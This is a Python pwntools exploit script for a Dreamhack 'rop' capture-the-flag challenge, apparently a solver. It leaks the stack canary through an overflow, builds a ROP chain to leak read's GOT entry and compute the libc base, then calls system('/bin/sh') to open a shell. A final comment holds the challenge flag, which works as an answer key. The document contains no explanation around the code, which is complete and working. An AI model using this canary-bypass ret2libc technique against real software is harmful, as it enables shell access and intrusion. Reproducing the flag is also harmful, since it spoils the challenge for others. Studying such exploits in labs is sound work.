#!/usr/bin/env python3

from pwn import *

HOST = "host3.dreamhack.games"
PORT = 15243

context.binary = elf = ELF('./rop', checksec = False)
libc = ELF('./libc.so.6', checksec = False)

p = process(elf.path)
# p = remote(HOST, PORT)

read_got = elf.got['read']
read_plt = elf.plt['read']
puts_plt = elf.plt['puts']
main = elf.symbols['main']
pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851
ret = 0x0000000000400596

p.sendafter(b'Buf: ', b'x'*57)
p.recvuntil(b'x'*57)
canary_leaked = u64(b'\x00' + p.recv(7)) 
log.info('canary_leaked = ' + hex(canary_leaked))

payload = b'x'*56 + p64(canary_leaked) + b'x'*8 + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main)
input()
p.sendafter(b'Buf: ', payload)  
read_leaked = u64(p.recv(6).ljust(8, b'\x00'))
log.info('read_leaked = ' + hex(read_leaked))
libc.address = read_leaked - libc.symbols['read']

p.sendafter(b'Buf: ', b'zzzz')
payload2 = b'y'*56 + p64(canary_leaked) + b'y'*8 + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\x00'))) + p64(ret) + p64(libc.symbols['system'])
input()
p.sendafter(b'Buf: ', payload2)

p.interactive()

# DH{8056b333681caa09d67d1d7aa48a3586ef867de0ac3b778c9839d449d4fcb0cf}